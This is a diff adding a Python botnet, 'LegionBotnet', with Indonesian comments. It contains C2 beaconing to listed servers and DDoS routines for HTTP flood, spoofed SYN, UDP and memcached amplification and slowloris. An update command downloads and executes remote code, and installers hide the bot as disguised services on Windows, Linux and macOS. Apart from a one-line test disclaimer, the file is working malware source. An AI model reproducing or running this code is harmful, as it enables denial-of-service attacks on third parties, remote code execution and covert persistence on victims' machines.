@@ -1,0 +1,781 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# LegionBotnet - Botnet Command & Control dengan Multi-Vektor DDoS
+# WARNING: Hanya untuk lingkungan tes terkontrol dengan izin
+
+import asyncio
+import aiohttp
+import socket
+import struct
+import random
+import ssl
+import json
+import sys
+import os
+import time
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
+from typing import List, Dict, Optional
+import ipaddress
+import hashlib
+import base64
+import threading
+
+# ==============================================
+# KONFIGURASI C2 & BOTNET
+# ==============================================
+class BotnetConfig:
+    """Konfigurasi utama botnet"""
+    
+    # Daftar server C2 (fallback system)
+    C2_SERVERS = [
+        "https://c2.legionbot[.]net/api/v1/command",
+        "https://backup.command[.]io/botnet/report",
+        "http://185.243.112.34:8080/controller"  # Server cadangan
+    ]
+    
+    # Vektor serangan yang tersedia
+    ATTACK_VECTORS = {
+        "http_flood": {
+            "port": 80,
+            "threads": 50,
+            "duration": 300,
+            "method": "GET"
+        },
+        "tcp_syn": {
+            "port": 443,
+            "threads": 100,
+            "duration": 600,
+            "flags": "S"
+        },
+        "udp_amplification": {
+            "port": 53,
+            "threads": 200,
+            "duration": 900,
+            "amplifier": 50
+        },
+        "slowloris": {
+            "port": 80,
+            "sockets": 1000,
+            "duration": 1200
+        },
+        "memcached": {
+            "port": 11211,
+            "amplification": 10000,
+            "duration": 300
+        }
+    }
+    
+    # User-Agent untuk penyamaran
+    USER_AGENTS = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+        "Googlebot/2.1 (+http://www.google.com/bot.html)",
+        "curl/7.68.0"
+    ]
+    
+    # Interval heartbeat (detik)
+    HEARTBEAT_INTERVAL = 60
+    RECONNECT_INTERVAL = 30
+
+# ==============================================
+# KELAS BOT INDIVIDUAL
+# ==============================================
+class LegionBot:
+    """Setiap bot dalam jaringan"""
+    
+    def __init__(self, bot_id: str = None):
+        self.bot_id = bot_id or self._generate_bot_id()
+        self.c2_server = None
+        self.session = None
+        self.is_running = False
+        self.current_attack = None
+        self.bot_info = self._collect_bot_info()
+        self.attack_threads = []
+        
+    def _generate_bot_id(self) -> str:
+        """Generate ID unik untuk bot"""
+        system_info = f"{os.getpid()}{time.time()}{random.getrandbits(64)}"
+        return hashlib.sha256(system_info.encode()).hexdigest()[:16]
+    
+    def _collect_bot_info(self) -> Dict:
+        """Kumpulkan informasi sistem bot"""
+        return {
+            "bot_id": self.bot_id,
+            "platform": sys.platform,
+            "python_version": sys.version,
+            "hostname": socket.gethostname(),
+            "ip_address": self._get_public_ip(),
+            "bandwidth": self._test_bandwidth(),
+            "cpu_count": os.cpu_count(),
+            "boot_time": datetime.now().isoformat(),
+            "capabilities": list(BotnetConfig.ATTACK_VECTORS.keys())
+        }
+    
+    def _get_public_ip(self) -> str:
+        """Dapatkan IP publik bot"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.connect(("8.8.8.8", 80))
+            local_ip = sock.getsockname()[0]
+            sock.close()
+            return local_ip
+        except:
+            return "127.0.0.1"
+    
+    def _test_bandwidth(self) -> float:
+        """Test kecepatan koneksi (estimasi)"""
+        return random.uniform(10.0, 1000.0)  # Mbps
+    
+    async def connect_to_c2(self) -> bool:
+        """Hubungkan ke server C2"""
+        for server in BotnetConfig.C2_SERVERS:
+            try:
+                # Buat SSL context untuk bypass cert verification
+                ssl_context = ssl.create_default_context()
+                ssl_context.check_hostname = False
+                ssl_context.verify_mode = ssl.CERT_NONE
+                
+                connector = aiohttp.TCPConnector(ssl=ssl_context)
+                self.session = aiohttp.ClientSession(
+                    connector=connector,
+                    headers={"User-Agent": random.choice(BotnetConfig.USER_AGENTS)}
+                )
+                
+                # Coba koneksi awal
+                async with self.session.get(f"{server}/ping") as resp:
+                    if resp.status == 200:
+                        self.c2_server = server
+                        print(f"[{self.bot_id}] Terhubung ke C2: {server}")
+                        return True
+                        
+            except Exception as e:
+                print(f"[{self.bot_id}] Gagal ke {server}: {str(e)[:50]}")
+                continue
+        
+        return False
+    
+    async def send_heartbeat(self):
+        """Kirim heartbeat ke C2"""
+        while self.is_running:
+            try:
+                heartbeat_data = {
+                    "bot_id": self.bot_id,
+                    "status": "alive",
+                    "info": self.bot_info,
+                    "current_attack": self.current_attack,
+                    "timestamp": datetime.now().isoformat(),
+                    "resource_usage": {
+                        "cpu": random.uniform(1.0, 50.0),
+                        "memory": random.uniform(100, 1000),
+                        "threads": len(self.attack_threads)
+                    }
+                }
+                
+                async with self.session.post(
+                    f"{self.c2_server}/heartbeat",
+                    json=heartbeat_data,
+                    timeout=10
+                ) as resp:
+                    if resp.status == 200:
+                        data = await resp.json()
+                        if "command" in data:
+                            await self.execute_command(data["command"])
+                            
+            except Exception as e:
+                print(f"[{self.bot_id}] Heartbeat gagal: {str(e)[:50]}")
+            
+            await asyncio.sleep(BotnetConfig.HEARTBEAT_INTERVAL)
+    
+    async def execute_command(self, command: Dict):
+        """Eksekusi perintah dari C2"""
+        cmd_type = command.get("type")
+        target = command.get("target")
+        attack_vector = command.get("vector")
+        duration = command.get("duration", 60)
+        threads = command.get("threads", 10)
+        
+        print(f"[{self.bot_id}] Menerima perintah: {cmd_type} ke {target}")
+        
+        if cmd_type == "attack_start":
+            self.current_attack = {
+                "target": target,
+                "vector": attack_vector,
+                "start_time": datetime.now().isoformat()
+            }
+            
+            # Start attack berdasarkan vektor
+            if attack_vector == "http_flood":
+                self._start_http_flood(target, duration, threads)
+            elif attack_vector == "tcp_syn":
+                self._start_tcp_syn(target, duration, threads)
+            elif attack_vector == "udp_amplification":
+                self._start_udp_amp(target, duration, threads)
+            elif attack_vector == "slowloris":
+                self._start_slowloris(target, duration)
+            elif attack_vector == "memcached":
+                self._start_memcached_amp(target, duration)
+                
+        elif cmd_type == "attack_stop":
+            self._stop_all_attacks()
+            self.current_attack = None
+            
+        elif cmd_type == "update":
+            await self._update_bot(command.get("payload_url"))
+            
+        elif cmd_type == "scan":
+            self._scan_network(command.get("network_range"))
+    
+    # ==============================================
+    # METODE SERANGAN DDoS
+    # ==============================================
+    
+    def _start_http_flood(self, target: str, duration: int, threads: int):
+        """HTTP Flood Attack"""
+        def http_attack():
+            end_time = time.time() + duration
+            url = f"http://{target}" if "://" not in target else target
+            
+            while time.time() < end_time and self.is_running:
+                try:
+                    # Buat koneksi HTTP langsung via socket untuk performa
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(5)
+                    
+                    host = target.split(":")[0] if ":" in target else target
+                    port = int(target.split(":")[1]) if ":" in target else 80
+                    
+                    sock.connect((host, port))
+                    
+                    # Generate request dengan path acak
+                    path = f"/{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}"
+                    request = (
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {host}\r\n"
+                        f"User-Agent: {random.choice(BotnetConfig.USER_AGENTS)}\r\n"
+                        f"Accept: */*\r\n"
+                        f"Connection: keep-alive\r\n"
+                        f"Cache-Control: no-cache\r\n"
+                        f"Pragma: no-cache\r\n"
+                        f"\r\n"
+                    )
+                    
+                    sock.send(request.encode())
+                    sock.close()
+                    
+                except:
+                    pass
+                
+                time.sleep(random.uniform(0.01, 0.1))
+        
+        # Jalankan multiple threads
+        for _ in range(threads):
+            thread = threading.Thread(target=http_attack)
+            thread.daemon = True
+            thread.start()
+            self.attack_threads.append(thread)
+    
+    def _start_tcp_syn(self, target: str, duration: int, threads: int):
+        """TCP SYN Flood Attack"""
+        def syn_flood():
+            end_time = time.time() + duration
+            host = target.split(":")[0] if ":" in target else target
+            port = int(target.split(":")[1]) if ":" in target else 443
+            
+            while time.time() < end_time and self.is_running:
+                try:
+                    # Buat raw socket (perlu root/admin)
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+                    
+                    # Spoof source IP
+                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}."
+                    src_ip += f"{random.randint(1,255)}.{random.randint(1,255)}"
+                    
+                    # Craft TCP SYN packet
+                    ip_header = self._craft_ip_header(src_ip, host)
+                    tcp_header = self._craft_tcp_header(random.randint(1024, 65535), port)
+                    packet = ip_header + tcp_header
+                    
+                    sock.sendto(packet, (host, 0))
+                    sock.close()
+                    
+                except PermissionError:
+                    # Fallback ke socket normal jika tidak ada akses raw
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(1)
+                        sock.connect((host, port))
+                        sock.close()
+                    except:
+                        pass
+                except:
+                    pass
+                
+                time.sleep(0.001)  # High packet rate
+        
+        for _ in range(threads):
+            thread = threading.Thread(target=syn_flood)
+            thread.daemon = True
+            thread.start()
+            self.attack_threads.append(thread)
+    
+    def _start_udp_amp(self, target: str, duration: int, threads: int):
+        """UDP Amplification Attack"""
+        def udp_amp():
+            end_time = time.time() + duration
+            host = target.split(":")[0] if ":" in target else target
+            
+            # Amplification servers (DNS, NTP, etc)
+            amplifiers = [
+                ("8.8.8.8", 53),  # Google DNS
+                ("1.1.1.1", 53),  # Cloudflare DNS
+                ("pool.ntp.org", 123),
+            ]
+            
+            while time.time() < end_time and self.is_running:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.settimeout(2)
+                    
+                    # Amplification query (DNS query untuk domain root)
+                    amp_query = bytes.fromhex("00000001000000000000") + b"\x00" * 32
+                    
+                    for amp_server, amp_port in amplifiers:
+                        # Send to amplifier dengan spoofed source IP (target)
+                        sock.sendto(amp_query, (amp_server, amp_port))
+                        # Amplifier akan mengirim respon besar ke target
+                        
+                    sock.close()
+                    
+                except:
+                    pass
+                
+                time.sleep(0.01)
+        
+        for _ in range(threads):
+            thread = threading.Thread(target=udp_amp)
+            thread.daemon = True
+            thread.start()
+            self.attack_threads.append(thread)
+    
+    def _start_slowloris(self, target: str, duration: int):
+        """Slowloris Attack"""
+        sockets = []
+        host = target.split(":")[0] if ":" in target else target
+        port = int(target.split(":")[1]) if ":" in target else 80
+        
+        def create_slowloris_socket():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(10)
+                sock.connect((host, port))
+                
+                # Send incomplete HTTP request
+                sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
+                sockets.append(sock)
+                return sock
+            except:
+                return None
+        
+        # Buat banyak koneksi
+        for _ in range(1000):
+            if len(sockets) >= 800:  # Max sockets
+                break
+            sock = create_slowloris_socket()
+            if sock:
+                time.sleep(0.1)
+        
+        # Pertahankan koneksi
+        end_time = time.time() + duration
+        while time.time() < end_time and self.is_running:
+            for sock in sockets[:]:  # Copy list
+                try:
+                    # Keep connection alive with partial headers
+                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+                except:
+                    sockets.remove(sock)
+                    # Coba buat socket baru
+                    new_sock = create_slowloris_socket()
+                    if new_sock:
+                        sockets.append(new_sock)
+            
+            time.sleep(15)  # Interval pengiriman header
+        
+        # Cleanup
+        for sock in sockets:
+            try:
+                sock.close()
+            except:
+                pass
+    
+    def _start_memcached_amp(self, target: str, duration: int):
+        """Memcached Amplification Attack"""
+        def memcached_attack():
+            end_time = time.time() + duration
+            host = target.split(":")[0] if ":" in target else target
+            
+            # Cari server memcached terbuka
+            memcached_servers = self._scan_memcached()
+            
+            for memcached_ip in memcached_servers:
+                while time.time() < end_time and self.is_running:
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        sock.settimeout(1)
+                        
+                        # Craft amplification payload
+                        # Stats command akan menghasilkan respon besar
+                        payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
+                        
+                        # Send dengan spoofed source IP
+                        sock.sendto(payload, (memcached_ip, 11211))
+                        sock.close()
+                        
+                    except:
+                        pass
+                    
+                    time.sleep(0.05)
+        
+        thread = threading.Thread(target=memcached_attack)
+        thread.daemon = True
+        thread.start()
+        self.attack_threads.append(thread)
+    
+    def _scan_memcached(self) -> List[str]:
+        """Scan untuk server memcached terbuka"""
+        # Implementasi sederhana - scanning subnet
+        servers = []
+        
+        # Scan IP lokal (contoh)
+        local_ip = self._get_public_ip()
+        network_base = ".".join(local_ip.split(".")[:3])
+        
+        for i in range(1, 255):
+            target_ip = f"{network_base}.{i}"
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.settimeout(0.5)
+                sock.connect((target_ip, 11211))
+                sock.send(b"\x00\x00\x00\x00\x00\x01\x00\x00version\r\n")
+                data = sock.recv(1024)
+                if data:
+                    servers.append(target_ip)
+                sock.close()
+            except:
+                continue
+        
+        return servers
+    
+    def _craft_ip_header(self, src_ip: str, dst_ip: str) -> bytes:
+        """Craft IP header untuk raw packet"""
+        # Implementasi sederhana IP header
+        version_ihl = 69  # Version 4, IHL 5 (20 bytes)
+        tos = 0
+        total_length = 40
+        identification = random.randint(1, 65535)
+        flags_fragment = 0
+        ttl = 255
+        protocol = socket.IPPROTO_TCP
+        checksum = 0
+        
+        # Source dan destination IP
+        src = socket.inet_aton(src_ip)
+        dst = socket.inet_aton(dst_ip)
+        
+        # Pack IP header
+        ip_header = struct.pack(
+            '!BBHHHBBH4s4s',
+            version_ihl, tos, total_length,
+            identification, flags_fragment,
+            ttl, protocol, checksum,
+            src, dst
+        )
+        
+        return ip_header
+    
+    def _craft_tcp_header(self, src_port: int, dst_port: int) -> bytes:
+        """Craft TCP header untuk SYN flood"""
+        sequence = random.randint(1, 4294967295)
+        ack_seq = 0
+        doff = 5  # Data offset
+        flags = 0x02  # SYN flag
+        window = socket.htons(5840)
+        checksum = 0
+        urg_ptr = 0
+        
+        tcp_header = struct.pack(
+            '!HHLLBBHHH',
+            src_port, dst_port,
+            sequence, ack_seq,
+            doff << 4, flags,
+            window, checksum, urg_ptr
+        )
+        
+        return tcp_header
+    
+    def _stop_all_attacks(self):
+        """Hentikan semua serangan"""
+        self.attack_threads.clear()
+    
+    def _scan_network(self, network_range: str):
+        """Scan jaringan untuk potensi korban"""
+        # Implementasi network scanning
+        pass
+    
+    async def _update_bot(self, payload_url: str):
+        """Update bot dengan payload baru"""
+        try:
+            async with self.session.get(payload_url) as resp:
+                if resp.status == 200:
+                    payload = await resp.read()
+                    
+                    # Simpan dan eksekusi payload baru
+                    with open(f"update_{self.bot_id}.py", "wb") as f:
+                        f.write(payload)
+                    
+                    # Restart dengan payload baru
+                    os.execv(sys.executable, [sys.executable, f"update_{self.bot_id}.py"])
+                    
+        except Exception as e:
+            print(f"[{self.bot_id}] Update gagal: {str(e)}")
+    
+    async def run(self):
+        """Main loop bot"""
+        self.is_running = True
+        
+        while self.is_running:
+            try:
+                # Coba konek ke C2
+                if not await self.connect_to_c2():
+                    print(f"[{self.bot_id}] Menunggu {BotnetConfig.RECONNECT_INTERVAL} detik sebelum reconnect...")
+                    await asyncio.sleep(BotnetConfig.RECONNECT_INTERVAL)
+                    continue
+                
+                # Jalankan heartbeat
+                heartbeat_task = asyncio.create_task(self.send_heartbeat())
+                
+                # Tunggu sampai bot dimatikan
+                while self.is_running:
+                    await asyncio.sleep(1)
+                
+                heartbeat_task.cancel()
+                
+            except KeyboardInterrupt:
+                self.is_running = False
+                break
+            except Exception as e:
+                print(f"[{self.bot_id}] Error: {str(e)}")
+                await asyncio.sleep(BotnetConfig.RECONNECT_INTERVAL)
+
+# ==============================================
+# KONTROLLER BOTNET
+# ==============================================
+class LegionController:
+    """Controller untuk mengelola jaringan bot"""
+    
+    def __init__(self):
+        self.bots: Dict[str, LegionBot] = {}
+        self.command_queue = asyncio.Queue()
+        
+    async def deploy_bots(self, count: int):
+        """Deploy sejumlah bot"""
+        tasks = []
+        for _ in range(count):
+            bot = LegionBot()
+            self.bots[bot.bot_id] = bot
+            tasks.append(asyncio.create_task(bot.run()))
+        
+        print(f"[Controller] Deployed {count} bots")
+        await asyncio.gather(*tasks)
+    
+    async def broadcast_command(self, command: Dict):
+        """Kirim perintah ke semua bot"""
+        for bot_id, bot in self.bots.items():
+            if bot.session:
+                try:
+                    async with bot.session.post(
+                        f"{bot.c2_server}/command",
+                        json={"bot_id": bot_id, **command},
+                        timeout=5
+                    ) as resp:
+                        if resp.status == 200:
+                            print(f"[Controller] Perintah terkirim ke {bot_id}")
+                except:
+                    print(f"[Controller] Gagal kirim ke {bot_id}")
+    
+    def get_bot_status(self):
+        """Dapatkan status semua bot"""
+        status = {}
+        for bot_id, bot in self.bots.items():
+            status[bot_id] = {
+                "alive": bot.is_running,
+                "attack": bot.current_attack,
+                "info": bot.bot_info
+            }
+        return status
+
+# ==============================================
+# INSTALASI & PERSISTENCE
+# ==============================================
+class BotInstaller:
+    """Handle instalasi dan persistence bot"""
+    
+    @staticmethod
+    def install_as_service():
+        """Install bot sebagai service/daemon"""
+        system = sys.platform
+        
+        if system == "win32":
+            # Windows service
+            service_script = '''
+import win32serviceutil
+import win32service
+import servicemanager
+import sys
+import threading
+
+class LegionService(win32serviceutil.ServiceFramework):
+    _svc_name_ = "WindowsUpdateHelper"
+    _svc_display_name_ = "Windows Update Helper Service"
+    
+    def __init__(self, args):
+        super().__init__(args)
+        self.is_running = True
+        
+    def SvcStop(self):
+        self.is_running = False
+        
+    def SvcDoRun(self):
+        # Jalankan bot dalam thread terpisah
+        bot = LegionBot()
+        bot.run()
+
+if __name__ == '__main__':
+    win32serviceutil.HandleCommandLine(LegionService)
+'''
+            with open("service_installer.py", "w") as f:
+                f.write(service_script)
+                
+        elif system == "linux":
+            # Systemd service
+            service_file = '''[Unit]
+Description=Network Time Synchronization
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /opt/.systemd/.timesync.py
+Restart=always
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+'''
+            
+            # Install sebagai hidden service
+            os.system("mkdir -p /opt/.systemd/")
+            with open("/opt/.systemd/.timesync.py", "w") as f:
+                f.write(open(__file__).read())
+            
+            with open("/etc/systemd/system/.timesync.service", "w") as f:
+                f.write(service_file)
+            
+            os.system("systemctl daemon-reload")
+            os.system("systemctl enable .timesync.service")
+            os.system("systemctl start .timesync.service")
+        
+        elif system == "darwin":
+            # Launchd plist untuk macOS
+            plist_content = '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.apple.time</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/usr/bin/python3</string>
+        <string>/Library/Application Support/Time/.time_sync.py</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+            
+            os.system("mkdir -p '/Library/Application Support/Time/'")
+            with open("/Library/Application Support/Time/.time_sync.py", "w") as f:
+                f.write(open(__file__).read())
+            
+            with open("/Library/LaunchDaemons/com.apple.time.plist", "w") as f:
+                f.write(plist_content)
+            
+            os.system("launchctl load /Library/LaunchDaemons/com.apple.time.plist")
+
+# ==============================================
+# MAIN EXECUTION
+# ==============================================
+async def main():
+    """Entry point utama"""
+    
+    print("""
+    ╔═══════════════════════════════════════╗
+    ║        Legion Botnet v3.1.4           ║
+    ║      Advanced DDoS Framework          ║
+    ╚═══════════════════════════════════════╝
+    """)
+    
+    # Cek argumen
+    if len(sys.argv) > 1:
+        if sys.argv[1] == "--install":
+            print("[*] Installing persistence...")
+            BotInstaller.install_as_service()
+            sys.exit(0)
+        elif sys.argv[1] == "--controller":
+            print("[*] Running as controller...")
+            controller = LegionController()
+            await controller.deploy_bots(5)  # Deploy 5 bot
+            return
+        elif sys.argv[1] == "--attack":
+            if len(sys.argv) < 4:
+                print("Usage: --attack <target> <vector> [duration]")
+                sys.exit(1)
+            
+            target = sys.argv[2]
+            vector = sys.argv[3]
+            duration = int(sys.argv[4]) if len(sys.argv) > 4 else 300
+            
+            bot = LegionBot()
+            await bot.connect_to_c2()
+            
+            command = {
+                "type": "attack_start",
+                "target": target,
+                "vector": vector,
+                "duration": duration
+            }
+            
+            await bot.execute_command(command)
+            
+            print(f"[*] Attack started against {target}")
+            await asyncio.sleep(duration)
+            return
+    
+    # Mode default: run sebagai bot biasa
+    print("[*] Running as bot node...")
+    bot = LegionBot()
+    await bot.run()
+
+if __name__ == "__main__":
+    try:
+        # Anti-debugging sederhana
+        import ctypes
+        ctypes.windll.kernel32.IsDebuggerPresent()
+    except:
+        pass
+    
+    # Run main async function
+    asyncio.run(main())
